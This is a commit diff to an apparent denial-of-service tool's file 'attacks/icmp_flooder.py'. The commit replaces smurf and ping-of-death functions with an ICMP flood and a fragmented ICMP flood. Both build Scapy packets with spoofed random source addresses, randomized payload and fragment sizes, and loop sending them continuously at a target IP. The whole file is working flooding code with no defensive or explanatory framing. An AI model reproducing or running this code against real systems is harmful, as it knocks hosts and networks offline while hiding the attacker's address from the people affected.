1373ce803a00ccbf6ea8afed661af05d84048b32
olrevs <psrb@ukr.net>
2019-05-27 23:00:01 +0200

    Improve ICMP packet fragmentation algorythm

--- attacks/icmp_flooder.py
+++ attacks/icmp_flooder.py
@@ -3,7 +3,7 @@ from sys import path
 path.append("..")
 import packet_builder
 
-def build_smurf_packet(destination_IP):
+def build_icmp_packet(destination_IP):
     """Generate ICMP ECHO request with spoofed source IP address.
     
     Argument:
@@ -12,31 +12,28 @@ def build_smurf_packet(destination_IP):
     """
     return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload()
 
-def build_ping_of_death_packet(destination_IP, IP_spoofing=True):
-    """Generate ICMP ECHO request with larger than normal packet length (65,535 bytes).
+def build_fragmented_icmp_packet(destination_IP):
+    """Generate fragmented ICMP packet with spoofed source IP address.
     
     Arguments:
     destination_IP -- the IP address of the target
-    IP_spoofing -- enable or disable source IP spoofing (default True)
 
     """
-    if IP_spoofing:
-        return fragment(IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/(packet_builder.generate_payload(1)*65500))
+    return fragment(IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())
 
-    return fragment(IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/(packet_builder.generate_payload(1)*65500))
-
-def start_smurf_flood(destination_IP):
-    """Continuously send ICMP ECHO packets with spoofed source IP address"""
+def start_icmp_flood(destination_IP):
+    """Continuously send ICMP ECHO packets"""
     try:
         while True:
-            send(build_smurf_packet(destination_IP), inter=packet_builder.generate_delay_for_packet())
+            send(build_icmp_packet(destination_IP), inter=packet_builder.generate_delay_for_packet())
     except KeyboardInterrupt:
         print("...Exiting...")
 
-def start_ping_of_death(destination_IP, IP_spoofing):
-    """Continuously send fragmented ICMP ECHO packets"""
+def start_fragmented_icmp_flood(destination_IP):
+    """Continuously send fragmented ICMP packets"""
     try:
         while True:
-            send(build_ping_of_death_packet(destination_IP, IP_spoofing), inter=packet_builder.generate_delay_for_packet())
+            for frag in build_fragmented_icmp_packet(destination_IP):
+                send(frag, inter=packet_builder.generate_delay_for_packet())
     except KeyboardInterrupt:
         print("...Exiting...")
